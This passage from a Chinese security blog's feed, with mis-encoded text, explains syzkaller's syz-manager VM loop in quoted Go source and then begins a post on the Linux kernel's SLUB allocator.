class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯é€šè¿‡å¦‚ä¸‹è°ƒç”¨é“¾æ¥åœ¨ VM ä¸­æ‰§è¡Œç¨‹åºï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="â‘¡-å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ-fuzzing">â‘¡ å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ fuzzing</h4><p>æ­¤æ—¶å·²ç»ä¸æ»¡è¶³å¯ä»¥è¿›è¡Œ crash å¤ç°çš„æ¡ä»¶äº†ï¼Œå› è€Œä¼šæœ‰ç¬¬äºŒä¸ªå°å¾ªç¯å¯åŠ¨æ–°åç¨‹<strong>å°†èµ„æºæ± ä¸­å‰©ä½™ VM è°ƒåº¦å» fuzzing</strong>ï¼Œ å¹¶å°†ç»“æœè¾“å‡ºåˆ° <code>runDone</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> å‡½æ•°å®é™…ä¸Šä¼šè°ƒç”¨ <code>runInstanceInner()</code>ï¼Œè¯¥å‡½æ•°<strong>ä»…å½“äº§ç”Ÿäº† Crash æ—¶è¿”å›çš„ç»“æœæ‰ä¸ä¸º nilï¼Œå³ runRepro é˜Ÿåˆ—å®é™…ä¸Šä¸º Crash é˜Ÿåˆ—ï¼š</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> çš„æ ¸å¿ƒéƒ¨åˆ†ä¸»è¦æ˜¯ï¼š</p><ul><li><p>è°ƒç”¨ <code>vmPool.Create()</code> åˆ›å»º VMï¼Œè°ƒç”¨ <code>inst.Forward()</code> è¿›è¡Œ TCP è½¬å‘ï¼Œæ‹·è´ <code>syz-fuzzer</code> ä¸ <code>syz-executor</code> åˆ° VM æ–‡ä»¶ç³»ç»Ÿä¸­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// è‹¥æä¾›äº† ExecutorBin , è¿™æ„å‘³ç€ syz-executor æ—©å·²åœ¨é•œåƒä¸­,</span><br><span class="hljs-comment">// æ•…æ— éœ€è¿›è¡Œæ‹·è´.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>instance.FuzzerCmd()</code> ç”Ÿæˆå‘½ä»¤è¡Œåè°ƒç”¨ <code>inst.Run()</code> å¯åŠ¨ <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>inst.MonitorExecution()</code> ç›‘æ§ VM è¿è¡Œï¼Œè¯¥å‡½æ•°ä¸»è¦æ˜¯<strong>é€šè¿‡è·å– kernel oops æ¥åˆ¤æ–­æ˜¯å¦è§¦å‘äº† crash</strong>ï¼ˆKASAN ä¸ä¼šé€ æˆ kernel panicï¼Œä»è€Œä½¿å¾—ä¸€ä¸ª VM å®ä¾‹é•¿æœŸè¿è¡Œï¼Œä¸è¿‡ dmesg ä¸­ä»æœ‰ oopsï¼‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-ç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®">Step 3. ç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h3><p><code>vmLoop()</code> çš„æœ€åä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§çš„ <code>select</code>ï¼Œç­‰å¾…æŸä¸ª channel ä¸­æœ‰æ•°æ®åè¿›è¡Œå¤„ç†ï¼Œä¹‹åé‡æ–°è·³å›ç­‰å¾…å¤„ç†æˆ–æ˜¯å¼€å§‹ä¸‹ä¸€è½®å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯èµ„æºæ± çš„ <code>Freed</code> channelï¼Œåœ¨ <code>Put()</code> ä¸­ä¼šå°†ç©ºé—² VM idx æ”¾å›èµ„æºæ± åå‘è¯¥ channel é€å…¥ä¸€ä¸ª <code>true</code>ï¼Œè€Œè¿™é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼Œç¬”è€…ä¼°è®¡ä¼šåœ¨åç»­ç‰ˆæœ¬ä¸­æ›´æ–°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> å…¶å®æ˜¯ <code>Manager.vmStop</code> ï¼Œè¿™ä¸ª channel ä¼šåœ¨ VM instance æ‰€å®ç°çš„ <code>Run()</code> æ–¹æ³•ä¸­è¢«ä½¿ç”¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å½“ <code>runDone</code> ä¸­æœ‰æ•°æ®æ—¶è¯´æ˜<strong>fuzz äº§ç”Ÿäº† crash</strong>ï¼Œæ­¤æ—¶ä¼šå°†äº§ç”Ÿ crash çš„ VM é‡Šæ”¾å›èµ„æºæ± ï¼Œå°† crash å†™å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…ä¸‹ä¸€è½®å¾ªç¯è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> ä¸­ä¸º crash çš„å¤ç°ç»“æœï¼Œè¿™é‡Œä¼šä¿å­˜å¤ç°ç»“æœå¹¶å°†å¯¹åº”çš„ crash ä» <code>reproducing</code> è¡¨ä¸­åˆ é™¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> ä¸­æœ‰æ•°æ®åˆ™è¡¨ç¤ºæ”¶åˆ°äº†ç»ˆæ­¢ä¿¡å·ï¼Œæ­¤æ—¶ä¼šå°† <code>shutdown</code> ç½®ä¸º nilï¼Œç»ˆæ­¢å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> ä¸Šä¹Ÿå¯èƒ½ä¼ æ¥ crashï¼Œæ­¤å¤„å°†å…¶é€å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…åœ¨åç»­å¾ªç¯ä¸­å¤ç°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> æ˜¯ä¸€ä¸ªä¼ è¾“ channel çš„ channelï¼Œè¿™é‡Œä¼šå°†ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ç»“æœä¼ å…¥ä¼ æ¥çš„ channel ä¸­å¹¶é‡æ–°è·³å›ç­‰å¾…ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ <code>reproRequest</code>ï¼Œè¯¥ channel æ„ä¸º<strong>ä¸»åŠ¨è¿›è¡Œå¤ç°çš„è¯·æ±‚</strong>ï¼Œè¿™é‡Œä¼šæ‹·è´ <code>reproducing</code> ä½å›¾åå°†å…¶ä¼ å…¥ä¼ æ¥çš„ channel ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ<code>syz-manager</code> çš„åŸºæœ¬è¿è¡Œé€»è¾‘åˆ†æå®Œæ¯•</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="æ¼æ´æŒ–æ˜" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x04ã€‘Linux Kernel å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</title>
    <link href="http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T18:24:42.000Z</published>
    <updated>2023-02-23T18:25:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯”èµ·å¤§çš„pageğŸ‘´è¿˜æ˜¯å–œæ¬¢å°çš„object</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºè¿™ç³»åˆ—æ–‡ç« ğŸ•ŠğŸ•ŠğŸ•Šå¤ªä¹…äº†ï¼Œå†…æ ¸çš„å†…å­˜ç®¡ç†ä¹Ÿå‘ç”Ÿäº†ä¸€å®šçš„å˜åŒ–ï¼Œæ‰€ä»¥æœ¬æ–‡ç›´æ¥ç”¨æœ€æ–°çš„ 6.2 ç‰ˆæœ¬çš„å†…æ ¸æºç ï¼šï¼‰</p></blockquote><p>åœ¨<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">ä¸Šä¸€ç¯‡æ–‡ç« </a> ä¸­ç¬”è€…ç®€è¦ä»‹ç»äº† buddy system çš„åŸºæœ¬æµç¨‹ï¼Œä½†å…¶ä¸ºä¸€ä¸ªã€Œé¡µã€è¿™ä¸€çº§çš„ allocatorï¼Œåœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨ï¼ˆï¼Ÿï¼‰éš¾å…æœ‰äº›æµªè´¹ï¼Œå› ä¸ºå†…æ ¸ä¸­éœ€è¦åŠ¨æ€å†…å­˜åˆ†é…çš„åœºæ™¯è™½ç„¶å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬<strong>é€šå¸¸å¹¶ä¸éœ€è¦ä½¿ç”¨ä¸€æ•´é¡µèµ·æ­¥çš„å†…å­˜ï¼Œè€Œå¾€å¾€æ˜¯éœ€è¦åˆ†é…ä¸€äº›æ¯”è¾ƒå°çš„å¯¹è±¡</strong>â€”â€”å› æ­¤ slab allocator åº”è¿è€Œç”Ÿï¼Œå…¶ä»£æ›¿æˆ‘ä»¬å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå¹¶åˆ†å‰²ä¸ºå¤šä¸ªå°çš„ objectï¼Œå½“æˆ‘ä»¬æ¯æ¬¡éœ€è¦æ—¶åªéœ€è¦å–ä¸€ä¸ª object å³å¯</p><blockquote><p>slab åˆè¢«ç§°ä¸ºå†…æ ¸çš„å †ï¼ˆheapï¼‰å†…å­˜ç®¡ç†ï¼Œå› ä¸ºå…¶ä¸ç”¨æˆ·æ€çš„å†…å­˜â€œå †â€ï¼ˆheapï¼‰ç±»ä¼¼ï¼Œéƒ½æ˜¯åŠ¨æ€åˆ†é…çš„å†…å­˜</p></blockquote><p>slab allocator ä¸€å…±æœ‰ä¸‰ç§ç‰ˆæœ¬ï¼š</p><ul><li>slabï¼ˆæœ€åˆçš„ç‰ˆæœ¬ï¼Œæœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œæ•ˆç‡ä¸é«˜ï¼‰</li><li>slobï¼ˆç”¨äºåµŒå…¥å¼ç­‰åœºæ™¯çš„æä¸ºç®€åŒ–ç‰ˆæœ¬ï¼‰</li><li><strong>slub</strong>ï¼ˆä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œ<strong>ç°åœ¨çš„é€šç”¨ç‰ˆæœ¬</strong>ï¼‰</li></ul><blockquote><p>è¿™ä¸‰ç§å†…å­˜åˆ†é…å™¨çš„é¡¶å±‚ API æ˜¯ä¸€è‡´çš„ï¼Œä½†å†…éƒ¨å®ç°æ˜¯ä¸ä¸€è‡´çš„ï¼ˆä¾‹å¦‚ slab å’Œ slub å„è‡ªæœ‰ä¸€ä¸ªå¯¹ <code>kmem_cache</code> çš„ä¸åŒå®šä¹‰ï¼‰</p></blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬ä¸»è¦ä»‹ç»çš„æ˜¯ <strong>slub</strong> ï¼Œä¹Ÿæ˜¯ç°åœ¨å†…æ ¸ä¸­æœ€ä¸ºé€šç”¨çš„å°å¯¹è±¡åˆ†é…å™¨</p><h1>0x01. slub allocator çš„åŸºæœ¬ç»“æ„</h1><p>é¦–å…ˆæ¥ä¸€å¼  Overviewï¼š</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="ä¸€ã€slabï¼šå•ä»½-object-æ± ">ä¸€ã€slabï¼šå•ä»½ object æ± </h2><p>Linux kernel ä¸­ç”¨ä»¥ç»Ÿç­¹æ‰€æœ‰å†…å­˜çš„ä¾ç„¶æ˜¯ buddy systemï¼Œslub allocator ä¹Ÿä¸ä¾‹å¤–ï¼Œå…¶è´Ÿè´£å‘ buddy system è¯·æ±‚å†…å­˜ååˆ†å‰²ç»™å¤šä¸ªå° object 